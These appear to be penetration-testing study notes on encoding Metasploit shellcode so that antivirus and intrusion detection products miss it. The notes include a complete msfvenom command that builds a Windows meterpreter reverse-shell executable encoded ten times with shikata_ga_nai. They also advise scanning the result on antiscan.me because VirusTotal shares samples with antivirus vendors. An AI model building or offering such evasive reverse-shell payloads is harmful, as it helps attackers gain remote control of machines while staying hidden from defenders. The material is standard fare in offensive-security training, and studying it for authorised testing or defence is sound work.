- Generating payloads is just the first step; nowadays security products, such as Intrusion Detection Systems (IDSs), antivirus and anti-malware software, can easily pick up the shellcode generated by MSFvenom. To help us evade security, we can use encoders to encode our shellcode.

## Place where all encoders reside
```python
┌──(root㉿kali)-[/home/hyok]
└─# ls /usr/share/metasploit-framework/modules/encoders      
cmd  generic  mipsbe  mipsle  php  ppc  ruby  sparc  x64  x86
```

#### Listing all the encoders using metasploit
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfconsole -q
[*] Starting persistent handler(s)...
msf6 > show encoders
```

## Encoding a payload
```python
msf6 > msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.216.9 -f exe -e x86/shikata_ga_nai -i 10 -o encoded.exe
```
- To encode one of our previous payloads, we simple add the `-e` option, followed by the encoder we want to use.
- We can use the `-i` option, followed by the number of times to encode the payload.

#### Verifying that your payload is detected by anvirus software or not, let's use virustotal:
Note - virustotal send the scan results of new payloads to the respected companies of antivirus software so that they can update their software. So, we can't use it instead we are going to use **[https://antiscan.me/](https://antiscan.me/)
